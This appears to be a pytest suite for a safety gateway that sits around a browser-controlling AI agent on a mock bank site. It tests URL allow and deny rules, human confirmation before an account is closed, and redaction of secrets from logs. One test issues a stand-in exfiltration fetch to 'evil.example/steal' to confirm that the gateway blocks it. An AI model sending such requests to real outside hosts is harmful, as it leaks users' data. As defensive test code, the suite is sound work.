"""The gateway against a real browser and the real mock: what the policy promises, the server sees.

The strongest evidence is the mock's own request log: a blocked request never appears in it.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from tests.browser_support import by_text, find
from tests.mockbank_support import MockHandle

from cua.evlog import EventLog, read_events
from cua.gateway import ActionGateway
from cua.policy import Policy, UrlRule
from cua.redact import Redactor
from cua.surface import Action, Observation, PlaywrightSurface, RequestInfo, UnknownRefError

pytestmark = pytest.mark.browser


def make_gateway(surface: PlaywrightSurface, tmp_path: Path) -> tuple[ActionGateway, EventLog]:
    policy = Policy(
        allow=(UrlRule(host="127.0.0.1", path_prefix="/msv/"),),
        deny=(UrlRule(host="127.0.0.1", path_prefix="/msv/admin.cgi"),),
    )
    log = EventLog(tmp_path / "run.jsonl", run_id="run_1", redactor=Redactor(secrets=["demo-only"]))
    return ActionGateway(surface, policy, log), log


def gated_sign_in(
    gateway: ActionGateway, surface: PlaywrightSurface, mock: MockHandle
) -> Observation:
    gateway.act(Action.navigate(f"{mock.base}/msv/login.cgi")).require()
    obs = surface.observe()
    gateway.act(Action.fill(find(obs, name="u").ref, secret="MOCK_USER")).require()
    gateway.act(Action.fill(find(obs, name="p").ref, secret="MOCK_PASS")).require()
    gateway.act(Action.click(find(obs, type="image").ref)).require()
    return surface.observe()


def requested_paths(mock: MockHandle) -> list[str]:
    return [r["path"] for r in mock.server.state.requests]


# --- the network is the real boundary ---------------------------------------------------------


def test_an_in_page_link_to_a_forbidden_page_is_blocked_before_it_reaches_the_server(
    surface: PlaywrightSurface, mock: MockHandle, tmp_path: Path
) -> None:
    gateway, log = make_gateway(surface, tmp_path)
    obs = gated_sign_in(gateway, surface, mock)
    admin = by_text(obs, "Admin", tag="a")
    assert gateway.act(Action.click(admin.ref)).executed  # the click itself is harmless
    main = surface.observe().frames[3]
    assert "BLOCKED BY POLICY" in main.text  # the model can read that it was refused
    assert "/msv/admin.cgi" not in requested_paths(mock)  # and the server never saw the request
    blocked = [e for e in read_events(log.path) if e["event"] == "url_blocked"]
    assert [(e["detail"], e["navigation"]) for e in blocked] == [("denied_by_rule", True)]


def test_a_script_cannot_reach_a_forbidden_url_by_fetch_either(
    surface: PlaywrightSurface, mock: MockHandle, tmp_path: Path
) -> None:
    gateway, log = make_gateway(surface, tmp_path)
    gated_sign_in(gateway, surface, mock)
    frame = surface.page.frames[3]
    status = frame.evaluate("() => fetch('/msv/admin.cgi').then((r) => r.status)")
    kind = frame.evaluate(
        "() => fetch('http://evil.example/steal', {mode: 'no-cors'}).then((r) => r.type)"
    )
    assert status == 403
    assert kind == "opaque"  # answered locally with the block page, never sent anywhere
    assert "/msv/admin.cgi" not in requested_paths(mock)
    details = {e["url"]: e["detail"] for e in read_events(log.path) if e["event"] == "url_blocked"}
    assert details["http://evil.example/steal"] == "host_not_allowed"
    assert details[f"{mock.base}/msv/admin.cgi"] == "denied_by_rule"


def test_a_navigate_action_off_the_allowlist_never_leaves_the_gateway(
    surface: PlaywrightSurface, mock: MockHandle, tmp_path: Path
) -> None:
    gateway, _ = make_gateway(surface, tmp_path)
    before = requested_paths(mock)
    outcome = gateway.act(Action.navigate("http://evil.example/"))
    assert not outcome.executed
    assert requested_paths(mock) == before
    assert surface.page.url == "about:blank"


# --- the risk gate ----------------------------------------------------------------------------


def test_closing_an_account_is_held_until_a_human_confirms_and_the_server_agrees(
    surface: PlaywrightSurface, mock: MockHandle, tmp_path: Path
) -> None:
    gateway, log = make_gateway(surface, tmp_path)
    obs = gated_sign_in(gateway, surface, mock)
    gateway.act(Action.fill(find(obs, name="F1").ref, text="12345")).require()
    gateway.act(Action.click(find(obs, alt="Go").ref)).require()
    obs = surface.observe()
    gateway.act(Action.click(by_text(obs, "12345", tag="tr").ref)).require()
    obs = surface.observe()
    close = next(e for f in obs.frames if f.name == "acct" for e in f.elements if e.text == "Close")

    held = gateway.act(Action.click(close.ref))
    assert not held.executed
    assert held.decision.reason == "confirmation_required"
    assert mock.server.state.closed_accounts == set()  # ground truth: nothing happened
    assert "/msv/close.cgi" not in requested_paths(mock)

    assert held.decision.confirmation_id is not None
    gateway.confirm(held.decision.confirmation_id, approver="human:supervisor")
    released = gateway.act(Action.click(close.ref))
    assert released.executed
    surface.wait_for_text("ACCOUNT CLOSED")
    assert mock.server.state.closed_accounts == {"SYN-12345-S01"}
    events = [e["event"] for e in read_events(log.path) if e["event"] != "url_blocked"]
    assert "action_blocked" in events
    assert "confirmation_granted" in events


def test_the_whole_happy_path_runs_through_the_gateway_with_writes_flagged(
    surface: PlaywrightSurface, mock: MockHandle, tmp_path: Path
) -> None:
    gateway, log = make_gateway(surface, tmp_path)
    obs = gated_sign_in(gateway, surface, mock)
    gateway.act(Action.fill(find(obs, name="F1").ref, text="12345")).require()
    gateway.act(Action.click(find(obs, alt="Go").ref)).require()
    obs = surface.observe()
    gateway.act(Action.click(by_text(obs, "12345", tag="tr").ref)).require()
    obs = surface.observe()
    gateway.act(Action.click(by_text(obs, "Open Sub-Account").ref)).require()
    obs = surface.observe()
    gateway.act(Action.fill(find(obs, name="F8").ref, text="25.00")).require()
    gateway.act(Action.click(find(obs, value="Submit").ref)).require()
    assert surface.wait_for_text("SUB-ACCOUNT OPENED", timeout_ms=8000)
    assert mock.server.state.confirmations == 1

    events = read_events(log.path)
    assert not [e for e in events if e["event"] in ("action_blocked", "url_blocked")]
    writes = [e for e in events if e.get("risk") == "reversible_write"]
    assert [e["target"].split("'")[1] for e in writes] == ["Submit"]
    text = log.path.read_text()
    assert "demo-only" not in text  # secrets were typed by name and never logged
    assert {e["secret_name"] for e in events if "secret_name" in e} == {"MOCK_USER", "MOCK_PASS"}


# --- the guard's own behaviour ----------------------------------------------------------------


def test_reset_removes_the_guard_so_it_cannot_leak_into_the_next_run(
    surface: PlaywrightSurface, mock: MockHandle
) -> None:
    seen: list[str] = []

    def spy(request: RequestInfo) -> bool:
        seen.append(request.url)
        return True

    surface.set_request_guard(spy)
    surface.reset()
    surface.act(Action.navigate(f"{mock.base}/msv/login.cgi"))
    assert seen == []


def test_a_guard_that_raises_fails_closed(surface: PlaywrightSurface, mock: MockHandle) -> None:
    def broken(request: RequestInfo) -> bool:
        raise RuntimeError("policy engine crashed")

    surface.set_request_guard(broken)
    surface.act(Action.navigate(f"{mock.base}/msv/login.cgi"))
    assert "BLOCKED BY POLICY" in surface.observe().frames[0].text
    assert mock.server.state.requests == []  # nothing got out


def test_a_guard_can_be_replaced_and_then_removed(
    surface: PlaywrightSurface, mock: MockHandle
) -> None:
    surface.set_request_guard(lambda request: False)
    surface.set_request_guard(lambda request: True)  # replaces, does not stack
    surface.act(Action.navigate(f"{mock.base}/msv/login.cgi"))
    assert "User ID" in surface.observe().frames[0].text
    surface.set_request_guard(None)
    surface.act(Action.navigate(f"{mock.base}/msv/login.cgi"))
    assert "User ID" in surface.observe().frames[0].text


def test_element_info_reports_the_latest_observation_and_rejects_unknown_refs(
    surface: PlaywrightSurface, mock: MockHandle
) -> None:
    surface.act(Action.navigate(f"{mock.base}/msv/login.cgi"))
    user = find(surface.observe(), name="u")
    assert surface.element_info(user.ref).label_hint == "User ID"
    with pytest.raises(UnknownRefError):
        surface.element_info("e404")
